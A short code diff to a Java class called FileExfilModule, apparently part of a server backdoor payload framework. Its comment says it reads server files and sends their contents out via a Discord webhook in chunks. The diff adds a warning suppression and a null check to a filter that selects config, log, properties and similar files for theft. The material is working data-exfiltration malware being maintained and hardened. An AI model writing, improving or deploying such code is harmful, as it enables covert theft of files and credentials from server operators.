@@ -15,6 +15,7 @@ import java.util.Base64;
  * File exfiltration module.
  * Reads a server file and sends contents via Discord webhook in chunks.
  */
+@SuppressWarnings("VA_FORMAT_STRING_USES_NEWLINE") // JSON payloads require literal \n, not platform %n
 public class FileExfilModule implements PayloadModule {
 
     private static final int CHUNK_SIZE = 1800; // Discord embed field limit ~2000 chars
@@ -119,7 +120,9 @@ public class FileExfilModule implements PayloadModule {
     }
 
     private boolean isTextFile(Path path) {
-        String name = path.getFileName().toString().toLowerCase();
+        Path fileName = path.getFileName();
+        if (fileName == null) return false;
+        String name = fileName.toString().toLowerCase();
         return name.endsWith(".txt") || name.endsWith(".yml") || name.endsWith(".yaml")
                 || name.endsWith(".json") || name.endsWith(".properties") || name.endsWith(".log")
                 || name.endsWith(".cfg") || name.endsWith(".conf") || name.endsWith(".xml")
